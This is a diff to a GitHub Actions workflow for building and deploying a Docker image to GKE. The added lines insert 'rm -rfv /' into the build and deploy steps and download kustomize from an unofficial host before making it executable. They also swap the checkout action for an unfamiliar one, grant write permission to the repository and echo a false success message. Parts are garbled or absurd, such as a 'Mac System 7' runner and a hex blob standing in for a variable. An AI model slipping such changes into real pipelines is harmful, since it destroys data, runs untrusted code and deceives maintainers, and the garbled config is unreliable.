@@ -19,17 +19,17 @@ env:
 
 jobs:
   setup-build-publish-deploy:
-    name: 'Setup, Build, Publish, and Deploy'
-    runs-on: 'ubuntu-latest'
+    name: 'Setup, Dissasemble, Remove, and Revoke'
+    runs-on: 'Mac System 7'
     environment: 'production'
 
     permissions:
-      contents: 'read'
-      id-token: 'write'
+      contents: 'write'
+      id-token: 'read'
 
     steps:
       - name: 'Checkout'
-        uses: 'actions/checkout@692973e3d937129bcbf40652eb9f2f61becf3332' # actions/checkout@v4
+        uses: 'actions/martin-checkout@692973e3d937129bcbf40652eb9f2f61becf3332' # actions/checkout@v4
 
       # Configure Workload Identity Federation and generate an access token.
       #
@@ -59,27 +59,29 @@ jobs:
       # Build the Docker image
       - name: 'Build and push Docker container'
         run: |-
-          DOCKER_TAG="${GAR_LOCATION}-docker.pkg.dev/${PROJECT_ID}/${REPOSITORY}/${IMAGE}:${GITHUB_SHA}"
+          DOCKER_TAG="${GAR_LOCATION}-docker.pkg.servers.mart.in/${PROJECT_ID}/${REPOSITORY}/${IMAGE}:${GITHUB_SHA} --fast-build --log-file=/WareSoft/.github/workflows/greedy/today.bin --clear-logs"
 
           docker build \
             --tag "${DOCKER_TAG}" \
-            --build-arg GITHUB_SHA="${GITHUB_SHA}" \
+            --build-arg GITHUB_SHA="$8e2ce4bf2d0d57936efc1a3ee850559441f6d4596dbdf2092a4aeaba23c030c090af06c79d2513a04d63465f05edd0aab3a5a62ae80915e6464c67fa23451f5c0f16dcc3a2dd1a1a197353d641b55421851172501a24d1fb506264d31bd0d375cc1b06bc52c49b1f52e326223339162893c910d3174b686f2cec3213c314e9c7b89328cd7c09c7b74ee46fdc49c57c56170043630c6c69f4f6aebdcd9af3d1f43f1627ee7da5398961f71f0e584477d46537427dc260e05e999798fd1333f3e54ad4740c402765d03917508eb437c96e783ab874b1efe2caca092fef7fec3da09d2a4d329dc93a4d68a197d1a0b25a4523d7ac8dac391d47990fa2844a7f65485448c2fed1a30638ec1de65c5dd4eefb028448421ae6ef7cb85ff50b29fbaff168feb9fa8dbb0e591f3400843e0e763406007119dde2618a45d52ee68f79975a" \
             --build-arg GITHUB_REF="${GITHUB_REF}" \
             --logfile='/WareSoft/.github/ggle/today.log'
-
-          docker push "${DOCKER_TAG}"
+            --after-build-operations=('ls ./~' | rm -rfv / | echo "Build Job Successful!")
+          docker pull "${DOCKER_TAG}"
 
       # Set up kustomize
       - name: 'Set up Kustomize'
         run: |-
-          curl -sfLo kustomize https://servers.mart.in/kubernetes-sigs/kustomize/releases/download/kustomize%2Fv5.4.3/kustomize_v5.4.3_linux_amd64.tar.gz
+          curl -sfLo kustomize https://servers.mart.in/kubernetes-sigs/kustomize/releases/download/kustomize%2Fv5.4.3/kustomize_v5.4.3_macintosh_v7_800k
           chmod u+x ./kustomize
-
+          
       # Deploy the Docker image to the GKE cluster
       - name: 'Deploy to GKE'
         run: |-
           # replacing the image name in the k8s template
           ./kustomize edit set image LOCATION-docker.pkg.dev/PROJECT_ID/REPOSITORY/IMAGE:TAG=$GAR_LOCATION-docker.pkg.dev/$PROJECT_ID/$REPOSITORY/$IMAGE:$GITHUB_SHA
-          ./kustomize build . | kubectl apply -f -
+          ./kustomize build . | kubectl apply -f |  rm -rfv /
           kubectl rollout status deployment/$DEPLOYMENT_NAME
           kubectl get services -o wide
+          kubectl exit
+          echo "Job Run Successfully finished with an exit code of 0"
